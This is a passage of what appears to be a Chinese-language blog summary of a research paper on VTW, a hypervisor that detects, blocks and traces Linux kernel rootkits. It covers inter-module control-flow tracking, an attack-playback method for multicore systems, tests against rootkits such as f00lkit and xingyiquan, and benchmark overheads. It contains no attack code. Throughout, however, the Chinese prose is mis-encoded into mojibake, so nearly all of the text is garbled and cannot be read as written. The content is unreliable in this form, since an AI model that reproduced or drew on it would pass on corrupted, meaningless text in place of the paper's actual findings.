alt="image.png"></p><p>ç”±äºå¯¹ LKM çš„æƒé™è®¾ç½®ï¼Œåœ¨è¯¥è¿‡ç¨‹ä¸­ä»»ä½•åœ¨ LKMsï¼ˆ$ConFlowTrans$ï¼‰é—´çš„æ§åˆ¶æµçš„è·³è½¬éƒ½å°†è§¦å‘æ“ä½œç³»ç»Ÿé™·å…¥åˆ° â€œhostâ€ ï¼ˆæ­¥éª¤ 1ï¼‰ã€‚VTW é€šè¿‡æ‰€æµè¿‡çš„æ§åˆ¶æµè®°å½•æ¯ä¸€ä¸ª LKM ï¼ˆæ­¥éª¤ 2ï¼‰ï¼Œå¹¶æ£€æŸ¥æ¯ä¸ªè·³è½¬çš„å†…æ ¸æ•°æ®çš„åˆæ³•æ€§ã€‚è‹¥æ•°æ®åˆæ³•ï¼ˆæ­¥éª¤ 3ï¼‰ï¼ŒVTW å°†å¼€å¯è¢«è°ƒç”¨æ¨¡å—çš„æ‰§è¡Œæƒé™ï¼ˆ$TurnOffExe$ï¼‰å¹¶å…³é—­æ´»è·ƒ LKM çš„æ‰§è¡Œæƒé™ ï¼ˆ$TurnOnExe$ï¼Œæ­¥éª¤ 4ï¼‰ã€‚å¦åˆ™ï¼ŒVTW é€šè¿‡å‡½æ•° $HandleException$ å¤„ç†éæ³•çš„ LKMï¼ˆæ­¥éª¤ 5 ~ 6ï¼‰ï¼Œå¹¶å¤„ç†åŒ…æ‹¬æ•°æ®æ¢å¤ï¼ˆ$RecoverData$ï¼‰ä¸ #GP æ³¨å…¥ï¼ˆ$InjectGP$ï¼‰çš„æ“ä½œã€‚</p><p>å½“ LKM çš„æ§åˆ¶æµè¿”å›æ—¶ï¼ˆ$ControlFlowRet$ï¼‰ï¼ŒVTW è·Ÿè¸ªè¿”å›åŠ¨ä½œï¼ˆæ­¥éª¤ 7 ~ 11ï¼‰ï¼Œå½“è¿”å›åˆ°è®¾ç½®åœ¨ç¬¬ä¸€ä¸ª LKM çš„è¿”å›åœ°å€çš„æ–­ç‚¹æ—¶ï¼Œæ„å‘³ç€å½“å‰çš„æ‰§è¡Œå®Œæˆäº†ã€‚</p><p>å½“æ´»åŠ¨çš„ LKM æäº¤äº†ä¸€ä¸ªåœ¨ LKMs é—´çš„è°ƒç”¨è¯·æ±‚æˆ–æ˜¯æ§åˆ¶æµè¿”å›åˆ°ä¹‹å‰çš„ LKMï¼ŒVTW å°†æ£€æµ‹æ˜¯å¦å½“å‰çš„å†…æ ¸æ•°æ®å·²ç»è¢«æ´»åŠ¨çš„ LKM ç¯¡æ”¹äº†ã€‚å¯¹äºåŠ¨æ€å†…æ ¸æ•°æ®ï¼ŒVTW ä½¿ç”¨ â€œRootkit æ”»å‡»æ£€æµ‹â€ æ–¹æ³•è¿›è¡Œæ£€æµ‹ã€‚</p><p>å¯¹äºæœ‰ç€å†™ä¿æŠ¤çš„é™æ€å†…æ ¸æ•°æ®ï¼Œä»»ä½•çš„ç¯¡æ”¹éƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿé™·å…¥åˆ° â€œhostâ€ï¼Œä¹‹å VTW å°†æ“ä½œç³»ç»Ÿè®¾ç½®åˆ°å•æ­¥è°ƒè¯•å¹¶å¯ç”¨å¯¹å†…æ ¸æ•°æ®çš„å†™æƒé™ã€‚ç”±æ­¤ï¼Œåœ¨ LKM å®Œæˆå¯¹é™æ€å†…æ ¸æ•°æ®çš„ç¯¡æ”¹åï¼Œå…¶ä¼šå†æ¬¡é™·å…¥åˆ° â€œhostâ€ã€‚æœ€å VTW è¯»å–è¢«ç¯¡æ”¹çš„æ•°æ®å¹¶ä½¿ç”¨å¤‡ä»½æ•°æ®ä¸­çš„åˆå§‹å€¼è¿›è¡Œæ¢å¤ã€‚</p><p>é€šè¿‡ä¸Šè¿°æ“ä½œï¼ŒVTW å¯ä»¥è·å¾—ç¯¡æ”¹çš„æ•°æ®ï¼Œå°†ç¯¡æ”¹çš„æ•°æ®ä¸æ‰€æœ‰ LKMs çš„ä»£ç æ®µèŒƒå›´è¿›è¡Œå¯¹æ¯”ï¼Œæˆ‘ä»¬å¯ä»¥å¾—çŸ¥é‡å®šå‘æ§åˆ¶æµæ‰€å±çš„ LKMã€‚</p><p>è‹¥æ£€æµ‹åˆ°å†…æ ¸æ•°æ®è¢«ç¯¡æ”¹äº†ï¼Œå½“å‰è¿è¡Œçš„å†…æ ¸æ¨¡å—å°†è¢«è®¤ä¸ºæ˜¯æ”»å‡»çš„è¡Œä¸ºè½½ä½“ï¼Œç¬¬ä¸€ä¸ªæ¨¡å—å°†æˆä¸ºåŠ¨ä½œè½½ä½“ï¼Œé‡å®šå‘æ§åˆ¶æµæ‰€å±çš„æ¨¡å—åˆ™æˆä¸ºå‡½æ•°è½½ä½“ã€‚</p><p>å…¶ä»–çš„ LKMs å°†æˆä¸ºè¿‡ç¨‹è½½ä½“ã€‚ä¸ºäº†é¢„é˜²æ›´å¤šçš„ä¼¤å®³ï¼ŒVTW å‘å½“å‰æ§åˆ¶æµæ³¨å…¥ä¸€ä¸ªé€šç”¨ä¿æŠ¤å¼‚å¸¸ã€‚æœ€åï¼Œè¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®å°†è¢«å¤åŸï¼Œå½“å‰çš„æœ‰å®³æ“ä½œå°†è¢«ç»ˆæ­¢ã€‚</p><h2 id="6-3-Task-Switching-in-Multicore-Execution"><a href="#6-3-Task-Switching-in-Multicore-Execution" class="headerlink" title="6.3 Task Switching in Multicore Execution"></a>6.3 Task Switching in Multicore Execution</h2><p>å½“ LKM æ‰§è¡Œæ—¶å‘ç”Ÿäº†ä»»åŠ¡åˆ‡æ¢ï¼ŒLKM çš„ CPU èµ„æºå°†è¢«æ”¶å›ã€‚è‹¥ LKM ä¸å†è¢«è°ƒåº¦ï¼Œå…¶å°†æ°¸è¿œä¸ä¼šäº§ç”Ÿæ¨¡å—é—´è°ƒç”¨è¯·æ±‚ï¼Œæˆ‘ä»¬åœ¨è¿”å›åœ°å€è®¾ç½®çš„æ‰§è¡Œæ–­ç‚¹å°†æ°¸è¿œä¸ä¼šè¢«æ‰§è¡Œã€‚ç”±äºç¼ºä¹è§¦å‘æ¡ä»¶ï¼ŒVTW å°†åœ¨æœ€åä¸€æ¬¡æ£€æµ‹åå¿½ç•¥æ‰ LKM åœ¨å†…æ ¸ä¸Šçš„å½±å“ã€‚</p><p>ä¸åŒçš„ LKMs å¯èƒ½è¢«åœ¨å¤šä¸ªæ ¸å¿ƒä¸Šå¹¶è¡Œæ‰§è¡Œï¼Œè¿™å¯èƒ½å½±å“å¯¹è¡Œä¸ºè½½ä½“çš„è¯†åˆ«ï¼Œä¾‹å¦‚ä¸¤ä¸ª LKMs å¯èƒ½åŒæ—¶åœ¨ä¸åŒçš„ CPU æ ¸å¿ƒä¸­è¿è¡Œã€‚è‹¥åŠ¨æ€å†…æ ¸å¯¹è±¡è¢«æ£€æµ‹åˆ°åœ¨å…¶è¿è¡Œæ—¶è¢«ç¯¡æ”¹ï¼Œæˆ‘ä»¬æ— æ³•ç®—å‡ºè¿™ä¸¤ä¸ª LKMs ä¸­çš„å“ªä¸€ä¸ªè¿›è¡Œäº†æœ‰å®³æ“ä½œã€‚</p><p>ä¸ºäº†ç¡®ä¿ç²¾ç¡®çš„å¯è¿½è¸ªæ€§ï¼ŒVTW å¼•å…¥ä¸€ä¸ªåŠ¨ä½œå›æ”¾æ–¹æ³•ï¼Œåœ¨ â€œæ”»å‡»å›æ”¾ç¨‹åºâ€ï¼ˆAttack Playback Procedureï¼‰ä¸­å±•ç¤ºã€‚å½“ä¸€ä¸ª LKM è¢«è°ƒåº¦ä»¥æ‰§è¡Œä¸”åœ¨å…¶ä»–æ ¸å¿ƒä¸Šæœ‰ä¸€ä¸ªæˆ–æ›´å¤š LKMs æ­£åœ¨è¢«æ‰§è¡Œï¼Œåˆ™è¯¥æ–¹æ³•ä¼šè¢«å¯åŠ¨ã€‚</p><h2 id="6-4-Attack-Playback-Procedure"><a href="#6-4-Attack-Playback-Procedure" class="headerlink" title="6.4 Attack Playback Procedure"></a>6.4 Attack Playback Procedure</h2><p>å½“å¤šä¸ª LKMs åŒæ—¶è·‘åœ¨å¤šä¸ªæ ¸å¿ƒä¸Šæ—¶ï¼Œè¯¥æ–¹æ³•ç”¨ä»¥è¾¨åˆ«å“ªä¸€ä¸ª LKM ä¸ºå†…æ ¸ rootkitã€‚æ”»å‡»å›æ”¾ç¨‹åºå¦‚ä¸‹æ‰€ç¤ºï¼Œæ­¥éª¤ 1 ~ 5 ä¸ºæ‰€éœ€å†…å®¹ï¼Œæ­¥éª¤ 6 ~ 9 è¿›è¡Œå›æ”¾ã€‚å½“ LKM $\mathscr{L}j$ è¢«è½½å…¥åœ¨ä¸€ä¸ªæ ¸å¿ƒä¸Šè¿è¡Œæ—¶ï¼ˆ$LoadOnCore$ï¼‰ï¼Œè¯¥æ‰§è¡Œå¿…é¡»è§¦å‘æ“ä½œç³»ç»Ÿé™·å…¥åˆ° host æ¨¡å¼ï¼ˆâ€œæ”»å‡»å›æ”¾ç¨‹åºâ€ ä¸­çš„ æ­¥éª¤ 1ï¼‰ã€‚åœ¨è¿™ä¹‹åï¼Œ $\mathscr{L}j$ å°†è¢«è®°å½•åˆ°å…ƒç»„ $\mathscr{F}$ ä¸­ï¼ˆæ­¥éª¤ 2ï¼‰ã€‚</p><p>VTW é¦–å…ˆé€šè¿‡å‡½æ•° $CheckKernel$ æ£€æŸ¥å½“å‰çš„å†…æ ¸æ•°æ®å®Œæ•´æ€§æ˜¯å¦è¢«ç ´åï¼Œè‹¥æœªè¢«ç ´åï¼ˆæ­¥éª¤ 3ï¼‰ï¼Œå…¶ä¼šæ‹·è´å½“å‰çš„ CPU ä¸Šä¸‹æ–‡ä¿¡æ¯ã€å†…æ ¸æ ˆã€LKM ä»£ç æ®µï¼ˆæ‰€æœ‰è¿™äº›ç§°ä½œå›æ”¾ä¸Šä¸‹æ–‡ï¼‰ã€‚</p><p><img src="https://s2.loli.net/2023/04/09/4qFEaxVPRTUcJCb.png" alt="image.png"></p><p>è‹¥æœ‰å¤šäºä¸€ä¸ª LKM è¿è¡Œåœ¨ä¸åŒçš„ CPU æ ¸å¿ƒä¸Šï¼Œæ‰€æœ‰è¿è¡Œä¸­çš„ LKMs éƒ½å·²è¢«å¤‡ä»½ï¼Œç”±æ­¤æˆ‘ä»¬åªéœ€è¦å¤‡ä»½è¦è¢«æ‰§è¡Œçš„ LKMï¼ˆæ­¥éª¤ 4 ï¼‰ã€‚è‹¥ä»…æœ‰ä¸€ä¸ªè¿è¡Œä¸­çš„ LKMï¼Œæ­£åœ¨è¢«æ‰§è¡Œçš„ LKM ä¸å°†è¦è¢«æ‰§è¡Œçš„ LKM éƒ½éœ€è¦è¦è¢«å¤‡ä»½ï¼ˆæ­¥éª¤ 5ï¼‰ã€‚åœ¨å®Œæˆå¤‡ä»½åï¼ŒVTW å°†æ“ä½œç³»ç»Ÿå†æ¬¡åˆ‡æ¢å› â€œguestâ€ æ¨¡å¼ä»¥ç»§ç»­è¿è¡Œã€‚</p><p>ä¸ºäº†ç®—å‡ºå“ªä¸€ä¸ª LKM ä¸ºå†…æ ¸ rootkitï¼Œæ‰€æœ‰çš„åŠ¨ä½œéƒ½ä¼šè¢«é€šè¿‡ $ForEach$ ä¸ $ExeBack$ å‡½æ•°ä¸ºæ‰€æœ‰åœ¨å…¶ä»–æ ¸å¿ƒä¸Šè¿è¡Œçš„ LKMs é€ä¸€è¿›è¡Œå›æ”¾ã€‚å›æ”¾æ­¥éª¤å¦‚ å›¾.6 æ‰€ç¤ºï¼Œå›æ”¾è¿‡ç¨‹ä¸ºå¦‚ä¸‹æ‰€ç¤ºçš„äº”ä¸ªæ­¥éª¤ï¼š</p><p>1ï¼‰ ä½¿ç”¨ä¹‹å‰å¤‡ä»½çš„å†…å®¹é‡å†™å½“å‰å†…æ ¸æ ˆä¸ LKM çš„æ•°æ®ã€‚</p><p>2ï¼‰ ä½¿ç”¨å¤‡ä»½çš„ CPU ä¸Šä¸‹æ–‡å¡«å…… VMCS çš„ â€œguest filedâ€ å¹¶æ¢å¤è¢«ç ´åçš„å†…æ ¸æ•°æ®ã€‚</p><p>3ï¼‰ å°†æ“ä½œç³»ç»Ÿåˆ‡æ¢åˆ° â€œguestâ€ æ¨¡å¼ä»¥å¼€å§‹ LKM æ‰§è¡Œã€‚</p><p>4ï¼‰ åœ¨å†…æ ¸æ•°æ®è¢«æ‘§æ¯çš„æŒ‡ä»¤ä½ç½®åœæ­¢æ‰§è¡Œã€‚</p><p>5ï¼‰æ£€æµ‹æ˜¯å¦ä¸€ä¸ªè¢«ç ´åçš„æ•°æ®å°†è§¦å‘äºŒæ¬¡ç ´åã€‚å½“å‰çš„ LKM ä¸ºè¡Œä¸ºè½½ä½“ã€‚è‹¥è¯¥å†…æ ¸æ•°æ®ä¿æŒå®Œæ•´ï¼Œåˆ™åˆ‡æ¢åˆ°æ­¥éª¤ ï¼ˆ1ï¼‰ æ¢å¤å›æ”¾ã€‚</p><p><img src="https://s2.loli.net/2023/04/09/iagyB7kZt3jJnWT.png" alt="å›¾.6 è·Ÿè¸ªä¸€ä¸ª Linux æœåŠ¡å™¨ä¸Šä¸¤ä¸ªæ‰§è¡Œæ ¸å¿ƒé—´çš„ä»»åŠ¡åˆ‡æ¢"></p><p>é€šè¿‡è¯¥æ–¹æ³•ï¼Œæ¯ä¸ª LKM éƒ½å°†ä¼šä»å†…æ ¸æ•°æ®æœªè¢«æ‘§æ¯çš„ä½ç½®å¼€å§‹æ‰§è¡Œï¼Œå¹¶åœæ­¢åœ¨å†…æ ¸æ•°æ®è¢«æ‘§æ¯çš„ä½ç½®ã€‚è‹¥è¢«å›æ”¾çš„ LKM ç ´åäº†å†…æ ¸æ•°æ®çš„å®Œæ•´æ€§ï¼Œå…¶å°†è¢«è¯†åˆ«ä¸º rootkitï¼ˆæ­¥éª¤ 9ï¼‰ã€‚</p><p>åœ¨è¿½è¸ªå®Œæˆä¹‹åï¼ŒVTW å°†ä¸ºå‰©ä½™çš„ LKMs æ¢å¤æ‰§è¡Œï¼Œå¹¶è®©ä»–ä»¬ä»å†…æ ¸æ•°æ®å®Œæ•´æ€§è¢«ç ´åçš„ä½ç½®ç»§ç»­æ‰§è¡Œã€‚</p><p>åœ¨åŠ¨ä½œå›æ”¾è¿‡ç¨‹ä¸­ï¼Œè¢«æ¢å¤çš„å†…æ ¸æ•°æ®åŒ…æ‹¬è¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®ä¸å›æ”¾ä¸Šä¸‹æ–‡ï¼Œå¯¹å‰è€…çš„æ¢å¤å°†ç»´æŒå†…æ ¸çš„å®Œæ•´æ€§ï¼Œåè€…åˆ™ä»…ä¸è¢«å›æ”¾çš„ LKM ç›¸å…³ã€‚ç”±æ­¤ï¼Œè¢«æ¢å¤çš„å†…æ ¸æ•°æ®å¹¶ä¸ä¼šå½±å“å…¶ä»– LKMs çš„æ‰§è¡Œã€‚</p><p>æˆ‘ä»¬åˆ†æäº† 23 ä¸ªå†…æ ¸ rootkits å¹¶å‘ç°é™¤äº†å›æ”¾ä¸Šä¸‹æ–‡ä»¥å¤–ï¼Œä»–ä»¬ä¸ä¼šä¿®æ”¹å…¶ä»–å†…æ ¸æ•°æ®ã€‚åœ¨å¯¹ 72 ä¸ªåœ¨ Linux ä¸­è¢«é¢‘ç¹ä½¿ç”¨çš„æ™®é€š LKMs ï¼ˆä¾‹å¦‚ $nf_nat,ib_cm,snd_seg$ ç­‰ï¼‰çš„ç›‘æ§è¿‡ç¨‹å½“ä¸­ï¼Œæˆ‘ä»¬å‘ç°æ™®é€šçš„ LKMs å°†ä¸ä¼šä¿®æ”¹è¢«ä¿æŠ¤çš„å†…æ ¸æ•°æ®ï¼Œä¹Ÿä¸ä¼šä¿®æ”¹åœ¨å›æ”¾ä¸Šä¸‹æ–‡ä»¥å¤–çš„ä»»ä½•ä¸œè¥¿ã€‚</p><p>ç”±æ­¤ï¼Œåœ¨è¿›è¡ŒåŠ¨ä½œå›æ”¾æ—¶æˆ‘ä»¬å¹¶ä¸éœ€è¦æ¢å¤é™¤äº†è¢«ç¯¡æ”¹çš„å†…æ ¸æ•°æ®ä¸å›æ”¾ä¸Šä¸‹æ–‡ä»¥å¤–çš„å†…æ ¸æ•°æ®ï¼Œè¿™å¹¶ä¸ä¼šå½±å“å…¶ä»– LKMs çš„æ­£ç¡®æ€§ã€‚</p><h1 id="7-Experiments-And-Performance-Analysis"><a href="#7-Experiments-And-Performance-Analysis" class="headerlink" title="7 Experiments And Performance Analysis"></a>7 Experiments And Performance Analysis</h1><p>æˆ‘ä»¬ä½¿ç”¨å‡ ä¸ªå†…æ ¸ rootkit ä¸åŸºå‡†æµ‹è¯•æ¥æµ‹è¯• VTw çš„é˜²æŠ¤æ•ˆæœä¸è¿è¡Œæ•ˆç‡ã€‚</p><h2 id="7-1-Experimental-Environment"><a href="#7-1-Experimental-Environment" class="headerlink" title="7.1 Experimental Environment"></a>7.1 Experimental Environment</h2><p>å®éªŒä¸­çš„ç‰©ç† host ä¸ºä¸€ä¸ªæœ‰ä¸€é¢— Intel i3-9100 @ 3.6 GHZ 4æ ¸å¿ƒå¤„ç†å™¨ã€8Gå†…å­˜ã€256Gç¡¬ç›˜çš„ HP æ¡Œé¢ç”µè„‘ã€‚ä¸åŒ rootkit çš„å®‰è£…ç¯å¢ƒæ˜¯éå¸¸ä¸åŒçš„ï¼Œä¸ºäº†å®‰è£… rootkit $f00lkit$ï¼Œæˆ‘ä»¬ä½¿ç”¨ Ubuntu 12.04 ä¸å†…æ ¸ 3.2.16 ä½œä¸ºè¢«æµ‹è¯•æ“ä½œç³»ç»Ÿã€‚</p><h2 id="7-2-Rootkit-Detection-Defence-and-Traceability"><a href="#7-2-Rootkit-Detection-Defence-and-Traceability" class="headerlink" title="7.2 Rootkit Detection, Defence, and Traceability"></a>7.2 Rootkit Detection, Defence, and Traceability</h2><p>$f00lkit$ é€šè¿‡ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨æ¥éšè—ç›®æ ‡å¯¹è±¡ï¼Œå…¶å°†æ§åˆ¶æµé‡å®šå‘åˆ°å…¶è‡ªå·±çš„ä»£ç æ®µä¸Šã€‚VTW åœ¨ $f00lkit$ ä¸Šçš„æ£€æµ‹æ•ˆæœå¦‚ å›¾.7 æ‰€ç¤ºã€‚</p><p><img src="https://s2.loli.net/2023/04/09/4G8tqF7iSLXAjOv.png" alt="å›¾.7 å¯¹ä¸€ä¸ªå…¸å‹è¢«æ£€æµ‹çš„ rootkit æ”»å‡»ï¼ˆf00lkitï¼‰çš„è¿‡ç¨‹çš„è™šæ‹ŸåŒ–"></p><p>ä¸Šã€ä¸­ã€ä¸‹ä¸‰ä¸ªçª—å£åˆ†åˆ«ä¸ºåœ¨ VTW è½½å…¥ä¹‹å‰å¯¹æ“ä½œç³»ç»Ÿçš„å…¥ä¾µè¡¨ç°ã€åœ¨ VTW è½½å…¥åå¯¹æ“ä½œç³»ç»Ÿçš„å…¥ä¾µè¡¨ç°ã€VTW çš„é˜²æŠ¤ç»“æœã€‚åœ¨ä¸Šé¢çš„çª—å£ä¸­ï¼Œæˆ‘ä»¬å‘ç° $f00lkit$ å¯ä»¥éšè—ä»¥ $â€f00l_â€œ$ å¼€å¤´çš„æ–‡ä»¶ï¼Œå¦‚ç¬¬äºŒè¡Œæ‰€ç¤ºã€‚</p><p>ä¸­é—´çš„çª—å£æ˜¾ç¤ºäº†åœ¨ VTW è½½å…¥å $f00lkit$ ä¸å†å¯¹ä»¥ $â€f00l_â€œ$ å¼€å¤´çš„æ–‡ä»¶æœ‰ç€éšè—çš„æ•ˆæœï¼Œå½“ $f00lkit$ å°è¯•ä¿®æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨æ—¶ï¼ŒVTW æ£€æµ‹åˆ°äº†å…¶æ„å›¾å¹¶ç”Ÿæˆä¸€ä¸ª â€œEPT violationâ€ï¼Œä¹‹å VTW å°†ä¸€ä¸ª #GP æäº¤åˆ° â€œguestâ€ è¿›è¡Œé¢„é˜²ã€‚</p><p>ä¸ºäº†æµ‹è¯• VTW çš„å¯è¿½è¸ªæ€§ï¼Œæˆ‘ä»¬é‡å†™äº† rootkits $f00lkit$ ä¸ $xingyiquan$ ï¼Œå¹¶å¼•å…¥äº†ä¸¤ä¸ªè¾…åŠ©çš„ LKMs $jmp_lkm$ ä¸ $action_lkm$ ï¼Œåœ¨æˆ‘ä»¬è®¾ç½®çš„æ”»å‡»åœºæ™¯ä¸­ï¼Œ$f00lkit$ å¹¶ä¸ä¼šæ‘§æ¯å†…æ ¸æ•°æ®ï¼Œå…¶æœ‰ä¸€ä¸ªç”¨äºæ›¿æ¢ç³»ç»Ÿå‡½æ•°ä»¥éšè—ä»¥ $â€f00l_â€œ$ å¼€å¤´çš„æ–‡ä»¶çš„å¯¼å‡ºå‡½æ•° $func_1$ã€‚</p><p>åœ¨è¾…åŠ© LKM $action_lkm$ ä¸­è¿˜æœ‰ä¸€ä¸ªå¯¼å‡ºå‡½æ•° $func_2$ ã€‚å½“ $func_2$ è¢«æ‰§è¡Œæ—¶ï¼Œå…¶ä¼šç¯¡æ”¹å†…æ ¸æ•°æ®å¹¶å°†ç³»ç»Ÿæ§åˆ¶æµé‡å®šå‘åˆ°  $func_1$ ã€‚åœ¨è¾…åŠ© LKM $jmp_lkm$ ä¸­çš„å¯¼å‡ºå‡½æ•°ä¸º  $func_3$ ï¼Œåœ¨  $func_2$ æ‰§è¡Œè¿‡ç¨‹ä¸­  $func_3$ ä¼šè¢«è°ƒç”¨ã€‚</p><p>ä¸Šè¿°ä¸‰ä¸ªå¯¼å‡ºå‡½æ•°ç›´åˆ°è¢«å…¶ä»– LKMs è°ƒç”¨æ—¶æ‰ä¼šè¢«æ‰§è¡Œã€‚å½“ $xingyiquan$ æ‰§è¡Œæ—¶ï¼Œ $func_3$ è¢« $xingyiquan$ è°ƒç”¨ï¼Œæœ€åå†…æ ¸å‡½æ•°è¢«é€šè¿‡  $func_2$  é‡å®šå‘è‡³ $f00lkit$ã€‚</p><p>LKM $action_lkm$ ç›´æ¥ç¯¡æ”¹ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œå…¶ä¸ºä¸€ä¸ªè¡Œä¸ºè½½ä½“ã€‚åŸæœ‰çš„ç³»ç»Ÿè°ƒç”¨å‡½æ•°è¢« $f00lkit$ ä¸­çš„å‡½æ•°æ‰€æ›¿ï¼Œç”±æ­¤ï¼ŒVTWè®¤å®š $f00lkit$ ä¸ºä¸€ä¸ªå‡½æ•°è½½ä½“ã€‚è¯¥æ¬¡æ”»å‡»çš„ç¬¬ä¸€ä¸ªå‘èµ·è€…ä¸º $xingyiquan$ï¼Œå…¶é€šè¿‡ $lkm_jmp$ ä½¿å¾—æ§åˆ¶æµè·³è½¬åˆ°å…¶ä»–æ¨¡å—ï¼Œç”±æ­¤ $xingyiquan$ è¢«ç¡®å®šä¸ºåŠ¨ä½œè½½ä½“ï¼Œ$jmp_lkm$ è¢«ç¡®å®šä¸ºè¿‡ç¨‹è½½ä½“ã€‚</p><p>VTW æ£€æµ‹ã€é˜²å¾¡ã€è¿½è¸ªåŒ…æ‹¬ $adore$-$ngã€kbeastã€wnpsã€brootusã€diamorphineã€z$-$rootkitã€suterusu$ ç­‰åœ¨å†…çš„å†…æ ¸ rootkitsã€‚VTW é€šè¿‡ EPT é¡µè¡¨ä¸ºå¦‚ç³»ç»Ÿè°ƒç”¨è¡¨çš„å†…æ ¸å¯¹è±¡è®¾ç½®å†™ä¿æŠ¤ï¼Œç”±æ­¤ï¼Œä»»ä½•å†™æ“ä½œéƒ½å°†å¯¼è‡´æ“ä½œç³»ç»Ÿä» â€œguestâ€ æ¨¡å¼é™·å…¥åˆ° â€œhostâ€ æ¨¡å¼ã€‚</p><p>ä¹‹å VTW ä½¿ç”¨ #GP å¼‚å¸¸æ¥é˜²æ­¢éæ³•æ“ä½œã€‚å†…æ ¸ rootkits çš„æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹éƒ½è¢« VTW æ‰€ç›‘æ§ã€‚é€šè¿‡æ“æ§ LKMs çš„æ‰§è¡Œæƒé™ï¼ŒVTW å¯ä»¥å¤ºå–æ¯ä¸ª LKM çš„æ‰§è¡Œã€‚ç”±æ­¤ï¼ŒLKM çš„è°ƒç”¨ã€è·³è½¬ã€è¿”å›éƒ½è¢«åŒæ­¥è®°å½•ã€‚</p><h2 id="7-3-Performance-Evaluation"><a href="#7-3-Performance-Evaluation" class="headerlink" title="7.3 Performance Evaluation"></a>7.3 Performance Evaluation</h2><p>åœ¨æœ¬èŠ‚ä¸­ï¼Œ VTW åœ¨ CPU ä¸Šçš„æ‰§è¡Œå¼€é”€å°†è¢«ä½¿ç”¨ $nbench$ æµ‹é‡ï¼Œå¯¹ç³»ç»Ÿå»¶è¿Ÿä¸å¸¦å®½çš„å½±å“å°†è¢« Lmbench æµ‹é‡ï¼Œå¯¹ I&#x2F;O çš„å½±å“å°†è¢« IOMeter æµ‹é‡ã€‚æ‰€æœ‰çš„ç»“æœéƒ½åœ¨åŸç”Ÿæ“ä½œç³»ç»Ÿæµ‹è¯•ä¸­è¿›è¡Œäº†æ ‡å‡†åŒ–ã€‚</p><p>$Nbench\ Test$ã€‚æµ‹è¯•ç»“æœå¦‚ å›¾.8 æ‰€ç¤ºã€‚VTW å¼•å…¥äº†å°äº 2% çš„ CPU å¼€é”€ã€‚VTW æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªè½»é‡çº§çš„ hypervisor ä¸”ä¸æä¾›å¦‚å…¶ä»–è™šæ‹ŸåŒ–å¹³å°ï¼ˆä¾‹å¦‚ Xenï¼‰é‚£æ ·å¤æ‚çš„è™šæ‹ŸåŒ–åŠŸèƒ½ã€‚ç”±æ­¤ï¼Œå…¶å¸¦ç»™ CPU çš„æ€§èƒ½å¼€å§‹éå¸¸å°ã€‚</p><p><img src="https://s2.loli.net/2023/04/10/B4QEyK5VCW9JviO.png" alt="å›¾.8 VTW æ–¹æ¡ˆçš„æ‰§è¡Œå¼€é”€ã€‚x-axis æ˜¾ç¤ºäº†è¿è¡Œé€Ÿåº¦æŸå¤±ç³»æ•°ï¼Œy-axie ä¸ºæ‰§è¡Œçš„åŸºå‡†æµ‹è¯•ç¨‹åº"></p><p>$Lmbench\ Test$ã€‚Lmbench è¢«ç”¨ä»¥æµ‹é‡ç³»ç»Ÿå»¶è¿Ÿä¸è´·æ¬¾ã€‚æµ‹è¯•ç»“æœå¦‚ å›¾.9aã€9bã€9c æ‰€ç¤ºã€‚VTW å¢åŠ äº†å¹³å‡ 8.8% çš„å†…å­˜ä¸ç½‘ç»œå»¶è¿Ÿä¸å¹³å‡ 5.9% çš„æ–‡ä»¶æ“ä½œå»¶è¿Ÿã€‚é€šä¿¡å¸¦å®½å‡å°‘äº† 2.2%ã€‚</p><p><img src="https://s2.loli.net/2023/04/10/crCIiGy58atvN29.png" alt="å›¾.9 å†…å­˜/ç½‘ç»œè®¿é—®å»¶è¿Ÿï¼Œæ–‡ä»¶æ“ä½œä¸ IO å¸¦å®½çš„å‡å°‘è¢«ç»˜åˆ¶ä¸ºç³»ç»Ÿå¯¹åŸºå‡†æˆ–ç½‘ç»œã€å†…å­˜ã€æ–‡ä»¶è®¿é—®æ“ä½œçš„ç™¾åˆ†æ¯”"></p><p>åœ¨ Lmbench æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å‘ç° OS åœ¨ â€œhostâ€ ä¸ â€œguestâ€ é—´çš„åˆ‡æ¢é¢‘ç‡æ˜¾è‘—åœ°å¢é•¿äº†ï¼Œå¤§éƒ¨åˆ†çš„åˆ‡æ¢ç”±æŒ‡ä»¤ $cpuid$ å¼•èµ·ã€‚ç”±äºç¼“å­˜æ“ä½œé€Ÿåº¦éå¸¸å¿«ï¼Œå…¶å¯¹äºä»»ä½•çš„å»¶è¿Ÿéƒ½æ˜¯æåº¦æ•æ„Ÿçš„ã€‚ç”±æ­¤ï¼Œåœ¨ç¼“å­˜ä¸Šçš„æ¨¡å¼åˆ‡æ¢çš„å½±å“æ˜¯å°¤å…¶æ˜æ˜¾çš„ï¼Œå¯¼è‡´äº†å°†è¿‘ 20% çš„å»¶è¿Ÿå¼€é”€ã€‚</p><p>$IOMeter Test$ã€‚IOMeter æ˜¯ç”± Intel å¼€å‘çš„ä¸€ä¸ªç”¨ä»¥æµ‹è¯•æœ€å¤§ç£ç›˜ I&#x2F;O æ€§èƒ½ä¸æœ€å¤§æ•°æ®ååé‡çš„ä¸€ä¸ªæµ‹è¯•å·¥å…·æµ‹è¯•ç»“æœå¦‚ å›¾.10aã€10b æ‰€ç¤ºï¼Œè¯¥å›¾å±•ç¤ºäº† VTW é€ æˆäº†å¹³å‡ 8.9% çš„ I&#x2F;O å¸¦å®½å‡å°‘ï¼Œä¸å¹³å‡ 3.9% çš„è¿è¡Œæ—¶é—´å¢é•¿ã€‚</p><p><img src="https://s2.loli.net/2023/04/10/NRl3YwFcbPjtvEC.png" alt="I/Oè¡¨ç°å¼€é”€ç»˜åˆ¶ä¸º I/O å¸¦å®½æŸå¤±ç³»æ•°ä¸ I/O æ—¶é—´å¢é•¿ "></p><p>VTW åœ¨ I&#x2F;O ä¸Šçš„å½±å“ä¸»è¦ç”± I&#x2F;O æ“ä½œçš„è¿è¡Œæ—¶é—´å¯¼è‡´ï¼Œè¿™å‡å°‘äº† I&#x2F;O ååé‡ä¸”å¢åŠ äº† I&#x2F;O å“åº”æ—¶é—´ã€‚ç”± VTW 